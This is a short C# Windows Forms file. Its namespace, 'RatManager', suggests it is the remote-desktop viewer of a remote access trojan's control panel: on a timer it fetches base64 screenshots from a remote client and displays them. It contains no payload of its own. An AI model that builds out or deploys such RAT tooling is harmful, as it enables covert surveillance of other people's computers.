using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatManager.SubPages
{
    public partial class RDP : Form
    {
        private string clientId;
        private Communicator communicator;
        public RDP(string clientId)
        {
            InitializeComponent();
            communicator = new Communicator();
            timer1.Start();
            timer1.Tick += Timer1_Tick;
        }

        private void Timer1_Tick(object? sender, EventArgs e)
        {
            var base64String = communicator.GetMyScreen();
            if (base64String.Length > 0)
            {
                try

                {
                    base64String = base64String.Substring(1, base64String.Length - 2);
                    var pic = Convert.FromBase64String(base64String);
                    using (MemoryStream ms = new MemoryStream(pic))
                    {
                        pictureBox1.Image = Image.FromStream(ms);
                    }
                }
                catch
                { }
            }
        }
    }
}
